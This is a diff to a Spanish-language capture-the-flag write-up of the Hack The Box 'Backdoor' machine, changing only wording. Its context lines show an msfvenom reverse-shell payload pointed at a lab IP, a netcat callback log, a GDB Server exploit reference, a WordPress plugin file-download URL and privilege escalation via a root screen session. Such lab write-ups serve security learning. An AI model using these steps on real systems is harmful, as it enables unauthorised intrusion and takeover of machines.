@@ -188,7 +188,7 @@ Filtered Requests: 4604
 Requests/sec.: 0
 ```
 
-Podemos ver el panel de login, en el cual he probado si es vulnerable a SQL Injection sin éxito:
+Podemos ver el panel de login, en el cual he probado si es vulnerable a **`SQL Injection`** sin éxito:
 ![wp-login](/assets/images/hackthebox/machines/backdoor/wplogin.png)
 
 Alternativamente, podemos realizar un análisis más profundo con **`wpscan`**:
@@ -338,7 +338,7 @@ http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdown
 Sin embargo esto no funciona, tal vez no tenemos permisos, probemos otra cosa. 
 Si volvemos a fijarnos en los puertos encontrados, vemos que el **1337** está cerrado. Este puerto es utilizado por [GDB Server](https://www.man7.org/linux/man-pages/man1/gdbserver.1.html)
 Buscando un poco en Google, he encontrado este exploit para la versión **`9.2`**: [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539)
-Vamos a descargarlo en nuestra máquina y comprobemos si es vulnerable. En primer lugar debemos utilizar **`msfvenom`** para generar el payload.
+Vamos a descargarlo en nuestra máquina y comprobemos si es vulnerable. Vamos a utilizar **`msfvenom`** para generar el payload.
 
 ```console
 p3ntest1ng:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.114 LPORT=9999 PrependFork=true -o rev.bin
@@ -366,7 +366,7 @@ connect to [10.10.16.114] from (UNKNOWN) [10.10.11.125] 35514
 python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 
-Vamos realizar un tratamiento a la tty para poder movernos con mayor comodidad.
+Vamos a realizar un tratamiento a la tty para poder movernos con mayor comodidad.
 
 ```console
 user@Backdoor:/home/user$ script /dev/null -c bash
@@ -404,7 +404,7 @@ Con el comando **`ps aux`** podemos listar todos los procesos en ejecución. De 
 root         913  0.0  0.1   6952  2436 ?        Ss   01:55   0:00 SCREEN -dmS root
 ```
 
-Como vemos, se está ejecutando una sesión **`screen`** con privilegios elevados. Vamos a entrar en la sesión:
+Como vemos, se está ejecutando una sesión **`screen`** referenciada con el nombre **`root`**. Vamos a entrar en la sesión:
 
 ```console
 p3ntest1ng:~$ /usr/bin/screen -x root/root
